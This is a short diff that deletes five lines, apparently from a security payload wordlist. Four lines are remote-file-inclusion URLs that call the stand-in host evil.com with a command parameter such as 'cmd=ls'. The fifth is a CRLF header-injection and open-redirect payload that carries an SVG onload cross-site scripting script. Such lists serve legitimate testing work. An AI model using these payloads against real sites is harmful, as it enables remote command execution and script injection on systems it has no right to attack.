@@ -1,5 +1,0 @@
-http://evil.com/cmd.gif?&amp;cmd=
-http://evil.com/cmd.gif?&amp;cmd=ls
-http://evil.com/cmd.gif?&cmd=
-http://evil.com/cmd.gif?&cmd=ls
-https://evil.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert(innerHTML)%E5%98%BE
